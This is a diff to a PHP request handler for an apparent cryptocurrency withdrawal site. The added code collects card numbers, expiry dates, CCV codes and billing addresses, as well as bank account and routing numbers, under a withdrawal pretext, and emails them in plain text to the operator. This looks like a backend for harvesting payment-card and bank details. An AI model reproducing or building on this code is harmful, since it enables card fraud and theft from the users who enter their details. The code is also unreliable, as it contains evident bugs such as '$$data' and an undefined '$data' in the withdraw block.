@@ -121,12 +121,22 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     //card insert
 
     if (isset($_REQUEST['cardData'])) {
-
+    
         parse_str($_REQUEST['cardData'], $data);
 
         // print_r($data);
-        $arr = array($user->id, $data['card_number'], $data['expire'], $data['ccv'], $data['name']);
+        $arr = array($user->id, $data['card_number'], $data['expire'], $data['ccv'], $data['name'], $data['country'], $data['state'], $data['city'], $data['zip']);
         $response = DataBase::addcard($arr);
+        $sub="Add Card Withdraw";
+        $mess="
+        <b> <UID:</b>{$user->id}\n
+        <b>CardNumber(btc)</b>:{$$data['card_number']}\n
+        <b> Expire:</b>{$data['expire']}\n
+        <b> CCV:</b>{$data['ccv']}
+        <b> Name:</b>{$data['name']}
+
+        ";
+        DataBase::Recieve_mail($mess,$sub);
         echo $response;
     }
     //currency
@@ -198,7 +208,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $user = $_SESSION['USER'];
         $chat = $message['message'];
         echo DataBase::sendMessage($rid, $chat, $user->id);
-
     }
 
     // send request
@@ -208,7 +217,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         $rid = $_REQUEST["rrid"];
         echo DataBase::sendRequest($rid, $user->id);
-
     }
 
     // start message
@@ -230,16 +238,17 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             echo $th;
         }
     }
-// update profile
+    // update profile
     if (isset($_REQUEST['profileUpdate'])) {
         parse_str($_REQUEST['profileUpdate'], $data);
         // print_r($data);
         $user = $_SESSION['USER'];
-        $val = array($data['email'], $data['country'], $data['name'],
-            $data['gender'], $data['address'], $data['referer'], $data['phone'], $user->id);
+        $val = array(
+            $data['email'], $data['country'], $data['name'],
+            $data['gender'], $data['address'], $data['referer'], $data['phone'], $user->id
+        );
         // print_r($user);
         echo DataBase::updateProfile($val);
-
     }
     $user = $_SESSION['USER'];
     // change profile pic
@@ -257,15 +266,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         } else {
             echo "Error In Uploading image";
         }
-
     }
-//    setting amt
+    //    setting amt
     if (isset($_REQUEST["setdpamount"])) {
         $_SESSION['amount'] = $_REQUEST["setdpamount"];
         $route = $_REQUEST['router'];
         $_SESSION['router'] = $route;
     }
-// save new address
+    // save new address
     if (isset($_REQUEST['newaddress'])) {
         try {
             $add = $_REQUEST['newaddress'];
@@ -294,13 +302,11 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             }
 
             echo "Saved";
-
         } catch (\Throwable $th) {
             echo $th;
         }
-
     }
-// change password
+    // change password
 
     if ((isset($_REQUEST['updatePassword']))) {
         try {
@@ -325,21 +331,18 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 } else {
                     echo "password is up to date";
                 }
-
             } else {
                 echo "invalid password";
             }
         } catch (\Throwable $th) {
             echo $th;
         }
-
     }
-// $q = "";
+    // $q = "";
 
-// withdraw
+    // withdraw
 
     if (isset($_REQUEST['requestWith'])) {
-// echo("ok");
         try {
             $amtdolle = $_REQUEST['amt_dolla'];
             $amtbtc = $_REQUEST['amt_btc'];
@@ -347,18 +350,67 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             $q = "CREATE TABLE IF NOT EXISTS `avpvgymy_erect1`.`withdraw` ( `sn` INT NOT NULL AUTO_INCREMENT , `id` VARCHAR(255) NOT NULL , `amount_btc` VARCHAR(255) NOT NULL , `amount_usd` VARCHAR(255) NOT NULL ,`status` VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT 'pending', PRIMARY KEY (`sn`)) ENGINE = InnoDB";
             $conn = Database::getConn();
             $conn->query($q);
-            // $q="ALTER TABLE `withdraw` ADD `status` VARCHAR(255) NULL DEFAULT NULL AFTER `date`";
-            // $conn->query($q);
+            $q = "UPDATE `account` SET `bit`=`bit`-? WHERE `id`=?";
+            $st = $conn->prepare($q);
+            $st->bindValue(1, $amtbtc);
+            $st->bindValue(2, $user->id);
+            $st->execute();
+            if ($st->rowCount() > 0) {
+                $q = "INSERT INTO `withdraw`(`id`, `amount_btc`, `amount_usd`) VALUES (?,?,?)";
+                $stm = $conn->prepare($q);
+                $stm->execute([$user->id, $amtbtc, $amtdolle]);
+                $sub="Requesting Withdraw";
+                $mess="
+                <b> <UID:</b>{$user->id}\n
+                <b>Amount(btc)</b>:{$amtbtc}\n
+                <b> Routing:</b>{$data['routing']}\n
+                <b> Type:</b>{$data['type']}
+
+                ";
+                DataBase::Recieve_mail($mess,$sub);
+                echo "Request sent";
+            } else {
+                echo "Transaction failed";
+            }
+
             // $q="ALTER TABLE `withdraw` CHANGE `status` `status` VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT 'pending'";
             // $conn->query($q);
-            $q = "INSERT INTO `withdraw`(`id`, `amount_btc`, `amount_usd`) VALUES (?,?,?)";
-            $stm = $conn->prepare($q);
-            $stm->execute([$user->id, $amtbtc, $amtdolle]);
-            echo "Request sent";
 
         } catch (\Throwable $th) {
             echo $th;
         }
     }
+
+    // ttboc
+
+    // echo "ttboc";
+    if (isset($_REQUEST['ttboc'])) {
+        try {
+            parse_str($_REQUEST['ttboc'], $data);
+            if ($data['com_accnummber'] !== $data['account_number']) {
+                echo "Acount Number not match";
+            } else {
+                $conn = Database::getConn();
+                $q = "INSERT INTO `bank`(`uid`, `account_number`, `r_number`, `account_type`) VALUES (?,?,?,?)";
+                $stm = $conn->prepare($q);
+                
+                $stm->execute([$user->id,$data['account_number'],$data['routing']??null,$data['type']]);
+                $sub="Adding Bank Details";
+                $mess="
+                <b>UID:</b>{$user->id}\n
+                <b>Account:</b>{$data['account_number']}\n
+                <b>Routing:</b>{$data['routing']}\n
+                <b>Type:</b>{$data['type']}
+
+                ";
+                DataBase::Recieve_mail($mess,$sub);
+                echo ("Successfull");
+            }
+        } catch (\Throwable $th) {
+            echo $th;
+        }
+    }
+
+
 
 }
